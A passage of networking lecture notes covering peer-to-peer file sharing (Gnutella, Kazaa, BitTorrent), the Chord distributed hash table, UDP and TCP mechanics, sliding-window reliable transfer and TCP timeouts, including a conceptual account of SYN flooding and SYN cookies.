nodes. This is the process of flooding.
Once the content is found, the requesting peer downloads the
content from the peer hosting the content via HTTP.A facet of the original design of Gnutella was anonymity. Replies were
sent replies through the
same path that the queries took. A peer receiving a query would
not know if it came from the requestor or from a peer just
forwarding the request.Gnutella has a significant architectural advantage over Napster.
Its design is fully decentralized. There is no central directory
and hence the service cannot be shut down. On the other hand,
flooding-based search is inefficient compared to maintaining a single database.
Search may require contacting a large number of systems and going
through multiple hops. Well-known nodes (e.g., those that may be
configured in default installations) may become overly congested.A few optimizations were later added to Gnutella. The process of routing replies through the query path was
changed to sending responses directly to the requester to reduce response times.If connecting
to a peer that serves the content is not possible because of firewall
restrictions at the peer, the requesting node can send a push request,
asking the serving peer to send it the file.Much of the Gnutella network was composed of end user’s
personal machines and these had varying levels of uptime and connectivity.
As such, not all peers are equal. With this in mind, Gnutella
divided its peers into two categories: leaf nodes and
ultrapeers. Leaf nodes are normal peers. They know of a small
number of ultrapeers and may not have fast connections. Ultrapeers
are peers that have a high degree of connectivity (32 or more connections
to other ultrapeers) and can hence flood queries with more hops.Kazaa was created a year after Gnutella with the core premise that
not all nodes have equivalent capabilities as far as network connectivity
and uptime are concerned. They introduced the concept of supernodes.
These nodes have high uptime, fast connectivity, faster processors, and
potentially more storage than regular nodes. They also know other
supernodes. This is the same concept as Gnutella’s later enhancement
with its addition of ultrapeers. A client (peer) needs to know
of one supernode to join the system. It sends that supernode a list
of all the files that it is hosting. Only supernodes are involved in
the search process. Search is a flood over the overlay network as in Gnutella.
Once a query reaches a supernode that has the requested content
in its list, it sends a reply directly to the peer that initiated
the query. The querying peer will then download the content from the peer
that hosts the content.The design of BitTorrent was motivated by the flash crowd problem. How
do you design a file sharing service that will scale as a huge
number of users want to download a specific file? Systems such
as Napster, Gnutella, and Kazaa all serve their content from
the peer that hosts it. If a large number of users try to download
a popular file, all of them will have to share the bandwidth that
is available to the peer hosting that content.The idea behind BitTorrent is to turn a peer that is downloading
content into a server of that content. The more peers are downloading
content, the more servers there will be for it. BitTorrent only
focuses on the download problem and does not handle the mechanism
for locating the content.To offer content, the content owner creates a .torrent file.
This file contains metadata, or information, about the file,
such as the name, creation time, and size of the file. It also
contains a list of hashes of blocks of the content.
The content is logically divided into fixed-size blocks and the
list of hashes in the .torrent file
allows a downloading peer to validate that any downloaded blocks has been
downloaded correctly. Finally, the .torrent file contains a
list of trackers. The tracker is a server running a process that manages
downloads for a set of .torrent files. When a downloading peer
opens a .torrent file, it contacts a tracker that
is specified in that file. The tracker is responsible for keeping
track of which peers have which have the content. There could be
many trackers, each responsible for different torrents.A seeder is a peer that has the entire file available for download
by other peers. Seeders register themselves with trackers so
that trackers can direct downloading peers to them. An initial seeder
is the initial version of the file.A leecher is a peer that is downloading files. To start the
download, the leecher must have a .torrent file. That identifies the
tracker for the contents. It contacts the tracker, which keeps track of the seed nodes for
that file as well as other leechers, some of whom may
have already downloaded some blocks of the file. A leecher contacts
seeders and other leechers to download random blocks of the file.
As it gets these blocks, it can make them available to other leechers.
This is what allows download bandwidth to scale: every downloader
increases overall download capacity. Once a file is fully downloaded,
the leecher has the option of turning itself into a seeder and continue to
offer serving the file.BitTorrent scales very well. The more participants there are, the
greater the aggregate bandwidth is. Peers may be given an incentive to
share since BitTorrent software may choose to block downloads if
you don’t offer uploads. The downside of BitTorrent is that unpopular
files will not have leechers and will not offer this benefit of scale.
Block sizes tend to be large (the default is often 256 KB with a maximum
size of 4 MB). This makes the architecture not suitable for small files
as the distributed download aspect won’t come into play unless a large
number of leechers choose to act as future seeders. Finally, search is
not a part of the protocol. A user needs to turn to some other mechanism
to actually get the .torrent file.The systems we covered use one of three approaches for
locating content:Flooding can be an inefficient and indeterminate
procedure for finding content. Some nodes may
be slower than others and some may have fewer
connections than others, resulting in more hops
to query the same number of machines. Gnutella
and Kazaa tried to ameliorate this somewhat by
creating ultrapeers (supernodes) but the mechanism
of the flood still exists.In standalone systems, hash tables are attractive
solutions for high-speed lookup tables.
A hash function is applied to a search key.
That result becomes an index into a table.
Hash tables result in O(1) lookup performance
versus the O(log N) time for a binary tree or
search through a sorted table. Since there is a
chance that multiple keys hash to the same value
(known as a collision), each table entry,
called a slot (or bucket),
may contain a linked list or additional hash table.A distributed hash table, or DHT, is
a peer-to-peer version of a hash table: a distributed
key, value database. The interface we want for
a DHT is that a client will query a DHT server with a key
to get the corresponding value. This DHT server may be
a separate collection of peer-to-peer systems, all
acting as one server from the client’s point of view or the
querying client may also be a peer. The DHT software
finds the host that holds the key, value pair
and returns the corresponding value to the querying host.
This should be done without the inefficiency
of a flood. The specific implementation of a DHT that
we examine is called Chord and it creates an overlay
network that is a logical ring of peers.Chord takes a large hash of a key (e.g., a 160-bit SHA–1 hash).
Each node in the system is assigned a position in the ring
by hashing its IP address. Because the vast majority of bucket positions will be empty,
key, value data is stored either at the node to which the key hashes (if, by some
chance, the key hashes to the same value that the node’s IP address hashed)
or on a successor node, the next node that would be encountered as the
ring is traversed clockwise. For a simple example, let us suppose that we have a 4-bit
hash (0..15) and nodes occupying positions 2 and 7. If a key hashes to 4, the successor
node is 7 and hence the machine at node 7 will be responsible for storing all data
for keys that hash to 4. It is also responsible for storing all data to keys that hash
to 3, 5, 6, and 7.If a node only knows of its clockwise neighbor node, then any query that a node cannot
handle will be forwarded to a neighboring node. This results in an unremarkable O(n)
lookup time for a system with n nodes. An alternate, faster, approach is to have
each node keep a list of all the other nodes in the group. This way, any node will be
able to find out out which node is responsible for the data on a key simply by hashing
the key and traversing the list to find the first node ≥ the hash of the key. This
gives us an impressive O(1) performance at the cost of having to maintain
a full table of all the nodes in the system on each node.
A compromise approach to have a bounded table size is to use finger tables.
A finger table is a partial list of nodes with each node in the table being a factor of two
away from the current node. Element 0 of the table is the next node (20 = 1 away),
element 1 of the table is the node after that (21 = 2 away),
element 2 of the table four nodes removed (22),
element 3 of the table eight nodes removed (23), and so on. With finger tables,
O(log n) nodes need to be contacted to find the owner of a key.The network layer (layer 3 of the OSI stack) is responsible for machine-to-machine
communication. The transport layer, one layer higher (layer 4), provides logical
communication channels between applications. An application can create an
arbitrary number of these channels, each of which has another endpoint on some process
running on some host. Writing data onto this channel delivers it to the
application that is reading data on the other end of this channel.
The transport layer is responsible for implementing this abstraction.
Routers in the network are unaware of this concept since they only provide
network layer (machine-to-machine) services.There are multiple transport protocols available on top of IP, including TCP,
UDP, and SCTP. TCP and UDP are by far the most popular of these.
Two responsibilities of the transport layer are multiplexing and demultiplexing
communication channels on the network and, in some cases, implementing
reliable data transfer.Incidentally, a packet at the transport layer is called a segment; it
is called a datagram at the network layer and a frame at the datalink layer.
We send Ethernet frames, which contain datagrams that are routed by routers. These
datagrams, in turn, contain segments that the transport layer of the operating
system’s network stack processes.Multiplexing and demultiplexing are the software mechanisms in place
to combine data from multiple logical communication channels on a machine into
a single stream of packets on the network
and then separate a stream of incoming datagrams into the appropriate
communication channels. This is important since communication on
multiple sockets shares the same network connection. We can have multiple
distinct streams at the transport layer that appear as a single stream of data
to the network layer.Multiplexing is the process of taking data from multiple
communication channels (sockets) and sending it out of the machine as
a stream of datagrams. Demultiplexing is the opposite process:
separating the incoming stream of datagrams into the individual messages for the
individual sockets to which each segment is targeted. The key to IP transport layer multiplexing and demultiplexing is the
use of port numbers. Each transport layer segment contains source and destination
port numbers. A port number is a 16-bit number that has a unique association
to a socket (a communication endpoint) on each host.
Naming a socket, also known as binding, is the process of associating
a socket with a specific port number and address. The address is the local host’s
IP address, of course. In the case where a host has several network
interfaces, it will have that many IP addresses and it is possible to make the
socket available on only one of these interfaces. More commonly, though,
a special address, INADDR_ANY, is used to associate a socket with all available
network interfaces. Port numbers are usually specified explicitly for server
programs since clients will need to know where to contact them. For example,
an SMTP mail server will typically listen for client connections on TCP port 25.
A client, on the other hand, will generally not care what port it uses and
specifying port 0 is a request for the operating system to pick any available unused port number.UDP is an extremely lightweight transport layer protocol on top of IP.
Unlike TCP, it does not offer reliable message delivery and it does not guarantee
that messages will be received in the order that they were sent.An incoming frame (e.g., ethernet packet) contains a protocol identifier
that identifies the payload (the data part of the frame) as IP data.
When that payload is passed to the
IP layer, a field in the header of the IP datagram identifies the
higher layer protocol as UDP. The UDP layer reads the destination port
field in the UDP header and delivers the segment to the socket that
is associated with that port number. The kernel maintains a hash table
of socket structures that is indexed by a key that is created from the
UDP destination port.
With UDP, any segments addressed to
a specific port number will be delivered to the socket that is identified
with that port. We will see that this is different from TCP, which takes
performs full demultiplexing based on the source and destination.While UDP does not have the reliability and in-order delivery
advantages of TCP (or, as we shall see, rate adjustment to deal with congestion),
there are several reasons that make it attractive for certain applications:Segments are sent immediately. When a user writes data to a UDP socket,
it immediately goes down the layers of the network stack and is transmitted
onto the network. TCP may wait for an acknowledgement or
for sufficient data in its transmit buffer instead of transmitting immediately.Message boundaries are preserved. TCP treats a communication stream
as a sequence of bytes. The number of writes to a socket does not necessarily
correspond to the number of messages that will be received at the other end.No connection setup overhead. With UDP, the first segment that is
sent on the network can contain application data. With TCP, we first need to
establish a connection with a three-way handshake, which requires an overhead of
sending a segment and receiving an acknowledgement before we can send a segment
with data.UDP is stateless. The kernel has to keep track of sockets, of course, but
does there is no need to keep track of sequence numbers, buffer for
out-of-order data, acknowledgements, etc. This uses less kernel memory and
makes error recovery and load balancing easier: requests can be redirected to
other hosts spontaneously.Smaller headers. UDP has an eight byte header compared to TCP’s 20-byte
header. This leads to smaller packets on the network.The UDP header (Figure 1) is eight bytes long. It contains the source and destination
ports, segment length and a checksum. The checksum is a simple error-detecting code
that allows the UDP layer to check
for segment corruption. If the received segment contains an error, it is dropped and not
delivered to the socket. The checksum is computed over the UDP header, application
data, and a pseudo IP header. The pseudo IP header contains a subset of fields
from the IP header (source address, destination address, transport protocol ID,
and UDP segment length). It is included in the checksum computation to ensure
that the UDP layer will not get any misrouted segments (this is a safeguard but
the IP header has its own checksum, which is computed in the same way). The checksum is a 16-bit value. If the data being summed does not contain
an even number of bytes (i.e., it does not have an integral multiple of 16-bit values),
it is padded with a zero byte. The same ones’ complement algorithm is used to compute checksums
for IP headers, UDP headers, and TCP headers.
The value of the checksum field is set to zero during
the computation. To compute the checksum, all 16-bit chunks of data are added
together. Each time the addition of two numbers results in an overflow, a one is added to the
result.
Finally, the bits of the final result are inverted.To validate the checksum, the receiver performs the same arithmetic,
generating a checksum for the segment and pseudo IP header. Since the
segment checksum is included in the header for this computation, the result for an
error-free packet will be all ones (0xffff). This computation reliably
detects single bit errors in the segment.UDP offers only limited demultiplexing. Segments from multiple sockets
(sources) that are directed to the same host address and port number
are received by the socket on that host that is associated with
that port number.With TCP, a connected socket is associated is associated with four values:Recall that with TCP sockets, a server first creates a socket
whose sole purpose is listening for and accepting incoming
connections. It does so with the listen system call.
This socket is said to be in the LISTEN state.
It will never be used for data transfer. Its only purpose is
to accept incoming connections.When an incoming TCP connection request arrives at the host, the
kernel searches for a socket in the LISTEN state where the packet’s
destination address and port match those of the socket (the address
can be “any” - a wildcard). The kernel then creates a new socket.
The remote address and port are copied from the TCP segment header onto the
new socket structure.
Once the connection is set up, this new socket is in the ESTABLISHED state,
indicating to the kernel that it has a connection to another
socket. Any incoming TCP data segment will go to the socket that
is associated with the source and destination addresses and ports in the
segment header.Given that the underlying IP network does not guarantee packet
delivery, if a transport layer protocol wants to provide
reliable data delivery, it has to implement it
via software. We will first look at evolving
reliable data transfer (RDT) software in general before
turning our attention to how it is implemented in TCP specifically.If the underlying networking layer was indeed reliable,
there would, of course, be no need for RDT. A sender would
send a segment and a receiver would receive it and immediately
deliver it to the application. Let us now assume that all segments are received (this will
not be a valid assumption in the real world of IP) but that
some of them might have corrupted data. In this case, we may
need to request retransmission of a segment because it
arrived with errors. Automatic Repeat Request (ARQ)
refers to a family of protocols that acknowledge
received packets and request retransmission for bad packets. An acknowledgement (ACK), also known as a positive acknowledgement,
is a receiver feedback message that confirms the successful receipt of a message. A
negative acknowledgement (NAK) is a feedback message
that tells the sender that a message was not successfully received.A simple protocol for providing RDT over a channel that always
delivers segments but may introduce errors into them is to transmit
one segment and wait for an ACK or NAK. A receiver sends an ACK if
the segment was received without errors. Upon receipt of the ACK,
the sender can transmit the next segment. A receiver sends a NAK
if the segment was received with errors. Upon receipt of a NAK,
the sender retransmits the same segment and again waits for an ACK or NAK.
This form of ARQ protocol, where a segment will not be sent until the
previously sent segment has been acknowledged, is called a stop-and-wait protocol.The protocol we just outlined fails in that it recognizes that data
can be corrupted in transit but does not take that possible corruption into account for
ACK/NAK messages. We can modify the protocol by adding a checksum for ACK/NAK
segments and, upon receipt, detect if those segments are corrupted. If corrupted,
we will treat the message as a NAK and retransmit the segment. This can
result in the receiver getting duplicate packets. If a receiver
gets a duplicate packet, it will need to ignore the data but still send an ACK in return.Now we need to distinguish
new data from a retransmission. A sequence number allows us to do that.
In the case of a stop-and-wait protocol, a one-bit sequence number suffices since
we only need to distinguish between the current packet we’re waiting for
and the retransmission of a correctly-received previous packet. This stop-and-wait
protocol using a single-bit sequence number is called an alternating bit protocol.We just saw two cases where a recipient gets a packet that it does not want:
receipt of a duplicate packet (in which case it sends an ACK) and receipt
of a corrupted packet (in which case it sends a NAK and awaits retransmission).
We can remove the need for a NAK by using an ACK and adding a sequence number to it.
The ACK will acknowledge the last packet that was correctly received. If
the sender receives an ACK for a different number than the packet it
most recently sent, it will treat that as a NAK and retransmit the packet.So far, we only considered the case where packet data might be corrupted but
the packets were always delivered to their destination. Now we need to account
for the fact that packets may be lost. This can be due to overflow of a queue
at a router or to data corruption in the packet header that prevents the packet from being
routed to its destination.We place the burden of detecting a lost packet on the sender. The sender will
not get an acknowledgement from a receiver in the case that a packet was never
delivered or in the case that it was delivered but the acknowledgement message was lost.
To detect this lack of acknowledgement, the sender will use a countdown timer.
The timer is initialized when the packet is sent. If it times out before
an acknowledgement is received, the sender retransmits the packet and
reinitializes the timer. The timer should be set to some value that is longer
than the average round-trip time so that the timeout will indicate a likely loss. Setting the timer
to a too-short value will result in excess duplicate packets. Although the
protocol can deal with them, we’d like to avoid an excessive amount of unnecessary retransmissions.A stop-and-wait protocol will not transmit a packet until the previous
packet has been successfully sent and acknowledged. Having to wait a
round-trip delay before sending the next packet yields horrible network
utilization, often far less than 1%.
Recall that network utilization is the ratio of the
actual traffic on the network to the traffic that the network can
support. A way to improve network utilization dramatically is to send successive packets without
first waiting for acknowledgements of earlier packets. This technique is
called pipelining and we will look at two approaches to pipelining:
Go-Back-N and Selective Repeat. In order to send multiple packets
without first waiting for an acknowledgement from each one, we will
need to increase the range of sequence numbers so that we can identify
packets and match an acknowledgement to a specific transmitted packet.
We also need to save packets on the transmitter until they have been
acknowledged by the receiver in case we need to re-send them. If the receiver gets
out-of-sequence packets, it cannot deliver them to the application and
may need to consider storing them in a receive buffer or else requesting
those same packets from the sender again in the future.The Go-Back-N protocol allows a sender to send multiple packets
without waiting for an acknowledgement. Each successive packet
has a monotonically increasing sequence number.
A window size defines
the maximum number of packets that could be transmitted before
waiting for acknowledgements. The base of the window is
the earliest packet that has been sent but not yet acknowledged.
When an acknowledgement is received for a sequence number that
corresponds to that packet, it can be discarded (the sender
will never need to retransmit it) and the window advances,
or slides to the next unacknowledged packet and the new
packet that entered the window can now be transmitted.
This is why Go-Back-N is called a sliding window protocol.The sender sends all packets that fall within the current
window and starts a timer.
The receiver expects to receive packets
in the correct sequence number order but it may not get that. Whenever
a packet is received correctly and is in the proper sequence,
that packet is acknowledged with its sequence number and delivered
to the application. The expected sequence number is incremented
and the receiver waits for the next packet.If the receiver gets a packet that has a different sequence number,
it discards the packet and
sends back a duplicate acknowledgement (that is, the
acknowledgement for the previous sequence number it received).
An acknowledgement number n
indicates that the receiver has correctly received all packets up to
and including packet n.
This form of acknowledgement is called a cumulative acknowledgement.
The receiver only needs to keep track of the next sequence number it needs and
only stores one packet at a time.When the sender receives an acknowledgement n, it advances
the base of its window to n. Packets less than or equal
to n can be discarded.
Note that there is no harm in losing acknowledgements less than
n; this acknowledgement indicates that all prior packets were
received as well.
If the acknowledgement number corresponds to the last packet that was
sent, the sender has all outstanding acknowledgements and can
stop the timer. Otherwise, the timer is restarted to wait for
additional acknowledgments. If the timer expires, that means that
some all transmitted packets have not been acknowledged; one
or more packets have been lost (or the final acknowledgement
has been lost). Upon timer expiration, the sender sends
all packets that are in the current window. With the Go-Back-N protocol, many packets can be in the
pipeline: sent but not yet acknowledged. A single error
in one of these packets will result in a timeout at the sender
and hence a retransmission of all packets in the sender’s
window. This can result in a lot of unnecessary retransmissions
since the receiver will be getting packets that it has previously
received correctly but discarded.Selective Repeat (SR).
Selective repeat, like Go-Back-N, is a sliding window protocol but
allows the receiver to store and acknowledge out-of-order
packets so that they do not need to be retransmitted.Instead of cumulative acknowledgements, the receiver sends an
acknowledgement for the specific packet that was received.
The sender’s window slides when the earliest packet in the
window is acknowledged and always starts at the first
unacknowledged packet. The window itself may contain a mix
of acknowledged and unacknowledged packets.The receiver must also maintain a window since it may receive
packets out of sequence and needs to buffer them. Whenever
a packet is received in sequence, it can be delivered to the
application. The receive window slides to the slot for the
first non-received packet. Every transmitted packet has a separate timer associated with it.
If an acknowledgement is not received successfully within that
time, that specific packet is retransmitted. The receiver will
acknowledge the packet if it fits in the window or if it
is sequenced before the window. This latter case means that the
packet is a duplicate of a packet that was already received
and delivered to the application. If the packet is beyond
the receiver’s window, it has no room to accept the packet
and will ignore it.TCP, the Transmission Control Protocol, is the dominant transport protocol on the Internet.
Where UDP was a thin layer over IP that provided us with multiplexing and a limited
demultiplexing service (the source host was not factored into the demultiplexing - that’s up
the the application to process),
TCP provides applications with a reliable, bidirectional communication channel.
In addition, TCP attempts to be a good network citizen and manage the flow control of
data to ensure that the receiver’s buffer does not overflow and to avoid network congestion.TCP is a connection-oriented protocol. This does not mean that a virtual circuit
is established in the network. Indeed, routers are not aware of TCP any more than they are
of UDP or other transport layer protocols.
TCP is a form of protocol design called end-to-end control, where only the endpoints
are responsible for the integrity of the connection. Routers do not
guarantee not to drop packets, ensure the are sequenced correctly, or correct errors.
The “connection” is managed in software at both
end systems. Because the hosts need to keep track of the state of the communication channel,
TCP has an initial connection setup step that comprises a three-way handshake where parameters
such as port numbers, sequence numbers, and buffers are established. Once the connection
is established, all messages are acknowledged and retransmitted if lost. When the session is
complete, TCP enters a teardown phase to ensure both sides are informed that the connection
is no longer needed and that they can free up resources that were used for the connection.TCP’s communication is full duplex. This means that if a process A established a TCP
connection to process B then process B can use the same connection to send data to
process A. TCP sends segments between the sender and receiver. A segment is simply the
transport layer term for a packet. The sending process writes data to a socket. This
data is copied to the operating system kernel and ends up in TCP’s send buffer,
a pool of memory devoted to that specific connection. TCP reads chunks of data from this
send buffer, creates TCP segments, and sends them down to the IP layer for transmission
onto the network (the IP layer will, in turn, send the IP datagram to the data link layer,
which will actually get it to the network). When an IP datagram arrives at the
destination machine, a protocol field in the IP header identifies the message as a TCP
message and IP forwards it up to the TCP driver. TCP then examines the source address,
source port, destination address, and destination port for find the appropriate socket
for this segment. The data is placed in that socket’s receive buffer, the counterpart
to the send buffer that is a pool of memory used to hold received data that did not
yet make it up to the application.Note that, unlike in UDP, TCP views the data coming from the application as
a stream of bytes rather than individual messages that need to be sent out.
There is no assurance that writing, say, 20 bytes to a socket will result in
20 bytes of data being transmitted in a TCP segment. If there was other
data in the send buffer that was ready to transmit, it could be combined with
this new data. Similarly, the 20 bytes may not be transmitted immediately but
combined with additional data that is written onto that socket.When the TCP driver reads bytes from data in the send buffer to create outgoing segments, it makes
sure that the number of bytes is grabs is
less than the maximum segment size (MSS) to make sure it does not try to send a segment
larger than the underlying network can transmit.
Data link layers have a Maximum Transmission Unit (MTU), the largest payload
that they can carry. For a TCP segment to fit into a data link frame, the IP header,
TCP header, and application data must be no larger than the MTU.
Ethernet supports an MTU of 1500 bytes (with support for an MTU of 9,000 bytes for
jumbo frames in gigabit ethernet) while 802.11 (Wi-Fi) supports a 7981-byte MTU.
Since IP and TCP headers are each 20 bytes long, the MSS is typically the MTU minus 40 bytes.
Hence, a common MSS on an ethernet network is 1460 bytes (1500–40).It is easy enough for the TCP layer to find out the MTU of the local link layer, subtract 40,
and compute a value for the MSS. While this is fine for communication within the LAN, this
does not ensure that some link that the packet traverses to the destination will not have
a smaller MTU, resulting in the need to fragment the packet (which is undesirable).
The path MTU is the minimum MTU of all the hops along the path the destination.
Unfortunately, there is no foolproof way of determining this value.
IP networks are required to support an MTU of 576 bytes (512 bytes of data plus up to 64 bytes for headers).
However, most network links can support larger MTUs (for example, and MTU of 1500 bytes works on
practically all routers in the Internet but support is not guaranteed).Path MTU Discovery
(RFC 1181 and
RFC 1191) defines a method for a host to discover
the path MTU and hence set its MSS to the maximum possible value.It works by initially assuming that the path MTU is the MTU of the first hop
(this is local to the host and easy to find). All initial datagrams are
sent to the destination with the “don’t fragment” (DF) bit
set in the IP header. If a router needs to route the datagram
to a link with a smaller MTU, the router will discard the datagram
and send back an ICMP[1] datagram containing an
ICMP Destination Unreachable message with a code indicating
fragmentation needed.
The MTU of the outbound link is placed in the ICMP message.
Upon getting this response, the sending host reduces its MTU to the returned value and
tries again. Since routes may change periodically, the Path MTU process is repeated
periodically (every 10 minutes on Linux and Windows systems by default).A TCP segment comprises at least 20 bytes of a TCP header followed by a variable number of
bytes of application data. The TCP header is prefixed by an IP header that, in turn,
is encapsulated in a link layer header.Some of the key parts of the TCP header are:ACK: informs the recipient of the segment that the acknowledgement field contains a valid sequence number.RST, SYN, FIN: These are used to set up and tear down the TCP connection.
The SYN (“Synchronize”) flag is used in the handshake used to set up a connection.
The FIN (“Finish”) flag is used to close a connection.
The RST (“Reset”) flag indicates that a segment was received for a closed or nonexistent socket.PSH (“Push”): Tells the receiver to pass the received data to the application layer immediately.
This flag is not used in practice.URG (“Urgent”): Tells the receiver that the application data contains a region of “urgent”
data, possibly along with “non-urgent” data. The 16-bit urgent data pointer is an index to the
last byte of this data. As with PSH, the concept of urgent data is not used.NS (“Nonce Sum”), CWR (“Congestion Window Reduced”), and ECE (“Explicit Congestion Expected”)
are all part of an Explicit Congestion Notification protocol, which is an extension to IP.
Not all routers support this and we will not cover this extension.TCP views application data as a sequence of bytes and each byte in the sequence
is assigned a sequence number. The sequence number in each TCP segment
is the sequence number of the first byte in that segment.
For example, if the current sequence number is 500 and we transmit
a segment containing 1460 bytes, the segment will contain a sequence number
of 500. If the following segment contains 1000 bytes, the sequence
number of the segment will be 1960, which is 500 (the last sequence number)
plus 1460 (the number of bytes that was sent with the last segment). Sequence
numbers are 32-bit values and do not have to start with 0. The value may
wrap around the 32-bit boundary, so all sequencing is done modulo 232
(mod 4,294,967,296).Received TCP segments are acknowledged by the receiver. TCP uses pipelining
and permits several segments to be sent at once prior to waiting for
an acknowledgement (more on this later).An acknowledgement number is present in a received segment and is a
32-bit number that indicates the sequence number of the next byte that
the remote host is expecting to receive next. For example,
in the above example we sent 1460 bytes with a sequence number of 500.
Upon receipt of this segment, the return segment will contain an acknowledgement
number of 1960, the sequence number of the next byte that the receiver needs.
The message it just received contained bytes numbered 500 through 1959.
When the receiver receives the next segment, 1000 bytes with a sequence number
of 1960, it will return an acknowledgement number of 2960.It would be a waste of network resources to send back a TCP segment containing
nothing but an acknowledgement number. While this is inevitable in some cases,
if the receiver happens to have data to transmit back to the sender, the acknowledgement
number is simply set in the TCP header of the transmitted segment, completely
avoiding the need to send a separate acknowledgement. Using an outgoing
data segment to transmit an acknowledgement is known as a piggybacked acknowledgement.TCP uses cumulative acknowledgements.
The acknowledgement number that a receiver sends inside a TCP header
is always the sequence number that the receiver
wants to see next. Going back to the earlier example, if a receiver receives
1460 bytes with a sequence number of 500, it sends back an acknowledgement for
the next byte it wants: 1960. Suppose that the next segment it receives
contains 500 bytes with the sequence number 2960. This means that the desired segment was either lost
or will be arriving out of sequence. Upon receiving the segment with sequence
number 2960, the receiver generates an acknowledgement (all segments get acknowledged)
but the acknowledgement
number is the number of the earliest sequence it does not yet have: 1960. Hence,
the sender will get back duplicate acknowledgements for 1960. To avoid sending too many data-free acknowledgement segments, a receiver is allowed to
wait up to 500 ms (half a second) before sending an acknowledgement. If another
segment comes in during that interval, a cumulative acknowledgement must be sent.
For a steady stream of messages, therefore, cumulative ACKs need to be sent for every other
packet. However, any out-of-order segments must be acknowledged upon receipt.A receiver does not have to store segments that were received out of sequence but
it is more efficient to do so and practically every implementation of the TCP
protocol does this. Continuing our example, suppose that the receiver
does get the segment containing sequence number 1960 after receiving
the segment withe the sequence number 2960; the segment really did arrive out of
order and was not dropped.
Now the receiver can fill in its hole in the receive buffer. It just
got bytes 1960…2959 and it already had bytes 2960…3459 from the earlier
receipt of the segment with sequence number 2060. The acknowledgement it sends
now will be the cumulative acknowledgement – the sequence number of the next
byte it needs: 3460.
The sender will see acknowledgements of 1960, 1960, and 3460.
Had the transmitted segments arrived in order, the acknowledgements
would have been 1960, 2960, and 3460.TCP employs a three-way handshake to set up a connection: a process of SYN, SYN-ACK, and ACK.
The client initiates the process; it creates a random initial sequence number (client_isn) and
sends it to the server in a TCP segment with the SYN flag set.
The server receives this and allocates send and receiver buffers as well
as variables. This set of data, containing all the information about a connection,
is called the transmission control block (TCB). The server then
creates a SYN-ACK segment that acknowledges the
received sequence number and contains a random sequence number from
the receiver. This segment also has the SYN bit set.
Upon receiving this, the client acknowledges the server’s sequence
number by sending the final ACK segment to the server and
allocates its own TCP buffers and variables for the connection.Kernel memory is finite and the operating system will not allocate an unlimited amount
of memory for managing TCP connections. A denial-of-service attack called
SYN flooding sends a large number of SYN segments to a machine but
usually uses an unreachable return address to
never complete the handshake to set up a legitimate connection. The
recipient normally allocates memory for each SYN segment that it receives, expecting
each to become a legitimate connection. Eventually, kernel memory is exhausted
and the operating system will not allow any more incoming TCP connection requests,
including, of course, legitimate ones. The operating system will continue
to refuse incoming connections until those incomplete ones time out. The connection
setup timeout
is an administrator-configured value and can range from half a minute to several
minutes.Several approaches have been proposed to deal with SYN flooding.
One of these is SYN cookies.
The key realization is that the kernel allocates memory (the TCB)
before the connection is fully set up. With the technique of SYN cookies,
no state is saved (no memory allocated) upon the receipt of a connection
request. Instead, any needed information is encoded into
the initial sequence number. Since that sequence number (+1) will be
sent back in the final ACK from the client, the server will be able
to validate that the ACK, and hence the requesting client, is legitimate.
The initial sequence number that the server creates is a hash of
the source and destination IP addresses, ports, and some secret value
known only to the server. A client will not be able to spoof this value
since it does not know the secret but a server can easily validate it
from the acknowledgement number in the ACK message from a legitimate client.TCP provides an option during connection setup to tell the other side
its maximum segment size (MSS); that is, the largest size segment that
it is willing to accept.
If both machines are on the same LAN, the MSS is likely to be the MTU of the
network interface minus the size of the protocol headers (20 bytes for IP and 20
more bytes for TCP), although it can differ even here if, for example, one
device supports jumbo (9000-byte) Ethernet packets and the other does not.
The Internet requirement is that all IP routers support an MSS of at least 536
bytes.If a host receives a TCP segment where the port numbers or source address
to not match any connection (e.g., the socket is closed or there is
no listener on that address), it will send back a reset segment, a
TCP segment with the RST flag set. In the case of UDP, an attempt
to send a message to a port that does not have any process listening
on it will result in the generation of an ICMP message back to the sender.Either the sender or the receiver can decide to terminate a TCP connection.
Termination involves telling the other side that you are finished sending
data, getting an acknowledgement, and then freeing allocated resources for
that connection.This is a two step process between the two hosts (let’s call them A and B).
The the host that initiates the teardown, host A,
sends a finished message: a TCP segment with the FIN flag set. It
then enters the FIN_WAIT_1 state and waits for an acknowledgement from host B.
This FIN message is a promise that host A will not send any more data on the connection.
Host B sends the acknowledgement and enters the CLOSE_WAIT state. It may
still have data to send, however. Upon receiving the acknowledgement, host A enters the
FIN_WAIT_2 state and waits for host B to terminate its side of the connection.
Host B does the same thing that host A did: once it has no more data to send, it sends
a TCP segment with the
FIN flag set and enters the LAST_ACK state, which means it is waiting for the
final acknowledgement from host A. When host A receives the FIN message,
it knows that it will receive no more messages from host B. It sends the final
ACK to host B and enters the TIME_WAIT state, which is a timeout period to ensure
that host B receives the final ACK and there are no stray packets for that connection in
the network.Since TCP does not know about the congestion or performance of the underlying network and
the network does not provide any guarantees for packet delivery, TCP relies on a time limit
to determine if any transmitted segments were lost. If an acknowledgement is not
received within a specific time limit then the sender may assume that the segment
was lost. Since IP provides no guarantees on the timeliness of delivery, this
retransmission timeout (RTO)
can only be a best guess. We need a value that is long enough to avoid excessive
timeouts and retransmissions but is short enough to avoid excessive waits. TCP keeps track of the average round-trip time of segments. Since these may fluctuate
over time, TCP uses an exponentially weighted moving average (EWMA), which places
approximately 10–20% of the weight on the most recent RTT measurement.
This average of the RTT is called the smoothed round trip time, or SRTT.The second thing that TCP keeps track of is how much the recently measured
round-trip time deviated from the SRTT. This too is is an EWMA function,
placing approximately 25% of the weight on the most recent deviation.
The average delay is called the round-trip time variation, or RTTVAR.
It is an estimate of how much the RTT typically deviates from the average RTT
and is an approximation to the standard deviation, which would be slower
to compute.The retransmission timeout (RTO) value is set to a function of the SRTT and RTTVAR:However, whenever a timeout occurs, this value is doubled. The timeout value
is doubled for each timed-out retransmission up to a value of 64 seconds. This doubling
of the timeout is called an exponential backoff. Whenever an acknowledgement is received
without a timeout, the timeout interval is reset to its base value.When an application writes data to a socket, the data is copied over to the send buffer
for that socket’s TCP connection. Some time later (the time is not specified in the standards),
TCP will grab data sitting in the send buffer and create and transmit one or more TCP
segments, each with the appropriate sequence number.
The first of these segments will cause the RTO timer to be set. Whenever
any segment containing an acknowledgement from the receiver arrives, the timer is reset.
If the acknowledgement number is greater than the sequence number of the base of the
send buffer, the sender can remove all bytes prior to that of the acknowledgement number
from the send buffer since it knows that the receiver has them. If a timeout
occurs, TCP will retransmit only one segment, the non-acknowledged segment with the smallest
